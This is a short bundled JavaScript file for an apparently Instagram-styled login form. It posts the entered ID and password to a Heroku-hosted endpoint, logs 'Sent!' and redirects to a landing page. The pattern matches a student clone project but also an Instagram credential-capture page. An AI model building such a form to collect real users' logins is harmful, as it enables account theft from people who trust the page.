(function(){function r(e,n,t){function o(i,f){if(!n[i]){if(!e[i]){var c="function"==typeof require&&require;if(!f&&c)return c(i,!0);if(u)return u(i,!0);var a=new Error("Cannot find module '"+i+"'");throw a.code="MODULE_NOT_FOUND",a}var p=n[i]={exports:{}};e[i][0].call(p.exports,function(r){var n=e[i][1][r];return o(n||r)},p,p.exports,r,e,n,t)}return n[i].exports}for(var u="function"==typeof require&&require,i=0;i<t.length;i++)o(t[i]);return o}return r})()({1:[function(require,module,exports){
function style_byID_Blue_short_p () {
    var textIn = pass.value
    var txtLen = textIn.length;
    console.log("hey")
    if( txtLen>8 ){
        log.className += ' blue'; //turn it blue
    } else {
        log.classList.remove('blue')
    }
}

document.addEventListener('onload', style_byID_Blue_short_p);
let id = document.querySelector(".id")
let pass = document.querySelector(".password")
let log = document.querySelector(".button")

log.addEventListener("click", () => {
    let user = {
        "id": id.value,
        "pass": pass.value 
    }
    fetch("https://insta-api-heroku.herokuapp.com/login", {
        method: 'post',
        body: JSON.stringify(user),
        headers: {
            'Content-Type': 'application/json',
          }
    }).then((resp) => {
        return resp.json();
    }).then((data) => {
        window.location.href = "/land.html"
        console.log("Sent!")
    })
})


},{}]},{},[1]);
